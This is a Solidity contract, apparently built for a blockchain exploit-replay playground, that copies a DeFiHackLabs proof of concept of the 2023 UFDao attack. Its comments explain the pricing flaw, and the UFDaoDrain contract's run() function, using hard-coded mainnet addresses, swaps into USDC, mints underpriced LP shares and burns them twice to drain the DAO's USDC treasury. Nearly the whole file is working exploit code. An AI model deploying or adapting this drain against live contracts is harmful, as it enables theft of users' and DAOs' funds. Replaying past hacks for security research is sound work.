// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

// Synthetic standalone exploit for the EVM Playground (2023-01-UFDao).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test
// contract (ContractTest IS the attacker: attacker = address(this), and
// the exploit is just testExploit()'s body — no standalone exploit
// contract to deploy). This is a self-contained, faithful copy of that
// inline attack (testExploit -> run()) so the playground can deploy it
// and record run(). Logic and constants copied verbatim from
// test/UFDao_exp.sol.
//
// Root cause: UFO/UFDao's LP token (UFT) prices redemption as a share of
// the ENTIRE DAO treasury (`_share = 1e18 * amount / totalSupply()`), while
// its permissionless Shop.buyPublicOffer() mints LP at a fixed, badly
// under-priced rate that ignores treasury size. Because totalSupply was
// tiny (6.8 UFT) relative to the ~90,112 USDC treasury, a single mint of
// ~111.62 UFT captured a ~94% redemption share for a fraction of its value.
// Two mint+burn rounds drain the DAO's USDC treasury down to dust.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function approve(address, uint256) external returns (bool);
    function decimals() external view returns (uint8);
}

interface IUniRouterV2 {
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable;
}

interface ISHOP {
    function buyPublicOffer(address _dao, uint256 _lpAmount) external;
}

interface IUFT is IERC20 {
    function burn(
        uint256 _amount,
        address[] memory _tokens,
        address[] memory _adapters,
        address[] memory _pools
    ) external;
}

contract UFDaoDrain {
    IUniRouterV2 constant Router = IUniRouterV2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    ISHOP constant shop = ISHOP(0xCA49EcF7e7bb9bBc9D1d295384663F6BA5c0e366);
    IUFT constant UFT = IUFT(0xf887A2DaC0DD432997C970BCE597A94EaD4A8c25);
    IERC20 constant USDC = IERC20(0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d);
    IERC20 constant WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    address constant UF = 0x2101e0F648A2b5517FD2C5D9618582E9De7a651A;

    function run() external {
        // step 1: fund with USDC via a WBNB -> USDC PancakeSwap swap.
        address[] memory path = new address[](2);
        path[0] = address(WBNB);
        path[1] = address(USDC);
        Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: 4 * 1e17}(
            1, path, address(this), block.timestamp
        );

        USDC.approve(address(shop), type(uint256).max);

        // step 2: mint a controlling LP share (round 1), then redeem the
        // ENTIRE DAO treasury's USDC pro-rata to that share.
        uint256 amount = USDC.balanceOf(address(this));
        shop.buyPublicOffer(UF, amount);

        address[] memory tokens = new address[](1);
        tokens[0] = address(USDC);
        address[] memory adapters = new address[](0);
        address[] memory pools = new address[](0);
        UFT.burn(amount, tokens, adapters, pools);

        // step 3: repeat on the residual treasury (round 2).
        amount = 1000 * 1e18;
        shop.buyPublicOffer(UF, amount);
        UFT.burn(amount, tokens, adapters, pools);
    }

    receive() external payable {}
}
